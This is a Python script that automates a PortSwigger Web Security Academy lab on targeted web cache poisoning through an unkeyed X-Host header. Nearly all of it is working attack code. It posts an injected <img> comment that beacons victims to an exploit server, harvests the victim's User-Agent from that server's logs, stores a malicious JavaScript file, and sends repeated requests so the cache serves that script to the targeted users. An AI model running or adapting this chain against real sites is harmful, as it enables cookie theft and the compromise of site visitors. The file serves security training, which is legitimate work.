##############################################################################
#
# Lab: Targeted web cache poisoning using an unknown header
#
# Hack Steps:
#      1. Fetch a post page
#      2. Extract the session cookie and the csrf token to post a comment
#      3. Post a comment with a payload to get the User Agent of the victim
#      4. Wait until the victim view comments to extract their User-Agent
#         from server logs
#      5. Store the malicious javascript file on your exploit server
#      6. Poison the main page for specific subset of users
#
##############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a19007e04646da980e08572002a0018.h1-web-security-academy.net" 

# Change this to your exploit server DOMAIN
EXPLOIT_SERVER_DOMAIN = "exploit-0ab9004604326d668028840d01400033.exploit-server.net" 

def main():
    print("⦗1⦘ Fetching a post page.. ", end="", flush=True)

    post_page = fetch(f"{LAB_URL}/post?postId=1")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ", end="", flush=True)

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Posting a comment with the injected payload in the comment field.. ", end="", flush=True)

    payload = f"<img src=https://{EXPLOIT_SERVER_DOMAIN}>"
    data = { "comment": payload, "csrf": csrf_token, "postId": "1", "name": "Hacker", "email": "hack@me.com" }
    cookies = { "session": session }
    post_data(f"{LAB_URL}/post/comment", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Waiting until the victim view comments to extract their User-Agent from server logs.. ", end="", flush=True)

    user_agent = extract_user_agent_from_logs()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "❯❯ Victim's User-Agent: " + Fore.YELLOW + user_agent)
    print(Fore.WHITE + "⦗5⦘ Storing the malicious javascript file on your exploit server.. ", end="", flush=True)

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8"
    js_file = "alert(document.cookie);"
    data = { "responseFile": "/resources/js/tracking.js", "responseBody": js_file, "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on" }
    post_data(F"https://{EXPLOIT_SERVER_DOMAIN}", data)

    print(Fore.GREEN + "OK")

    # send multiple request to cache the request
    # 10 is enough
    for counter in range(1,11):
        print(Fore.WHITE + f"⦗6⦘ Poisoning the main page for specific subset of users ({counter}/10).. ", end="\r", flush=True)
        
        headers = { "X-Host": EXPLOIT_SERVER_DOMAIN, "User-Agent": user_agent }
        requests.get(LAB_URL, headers=headers)

    print(Fore.WHITE + "⦗6⦘ Poisoning the main page for specific subset of users (10/10).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The main page is poisoned successfully")
    print(Fore.WHITE + "🗹 The lab may not be marked as solved automatically for unknown reasons")
    print(Fore.WHITE + "🗹 Use the User-Agent string with burp if so")


def fetch(url):
    try:  
        return requests.get(url)

    except:
        print(Fore.RED + f"⦗!⦘ Failed to fetch {url} through exception")
        exit(1) 


def post_data(url, data, cookie = None):
    try:    
        return requests.post(url, data, cookies=cookie)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


def extract_user_agent_from_logs():
    while(True):
        log_page = fetch(f"https://{EXPLOIT_SERVER_DOMAIN}/log")
        user_agent = re.findall("(Mozilla/5.*Victim.*)&quot;", log_page.text)
        
        if len(user_agent) != 0:
            return user_agent[0]
        else:
            continue


if __name__ == "__main__":
    main()